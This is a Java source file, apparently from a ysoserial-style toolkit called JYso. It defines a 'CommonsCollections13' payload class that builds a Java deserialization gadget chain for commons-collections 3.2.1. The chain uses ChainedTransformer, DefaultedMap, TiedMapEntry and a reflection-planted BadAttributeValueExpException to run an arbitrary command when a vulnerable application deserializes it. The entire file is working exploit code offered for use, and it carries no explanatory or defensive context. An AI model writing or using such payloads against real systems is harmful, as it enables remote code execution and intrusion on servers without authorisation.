package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;
import com.qi4l.JYso.gadgets.utils.Reflections;
import com.qi4l.JYso.gadgets.utils.cc.TransformerUtil;

import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

@Dependencies({"commons-collections:commons-collections:3.2.1"})
@Authors({Authors.Jayl1n})
public class CommonsCollections13 implements ObjectPayload<Object>{
    @Override
    public Object getObject(String command) throws Exception {
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });
        final Transformer[] transformers = TransformerUtil.makeTransformer(command);
        final Map innerMap = new HashMap();
        final Map defaultedmap = DefaultedMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(defaultedmap, "foo");

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, entry);

        // arm with actual transformer chain
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        return val;
    }
}
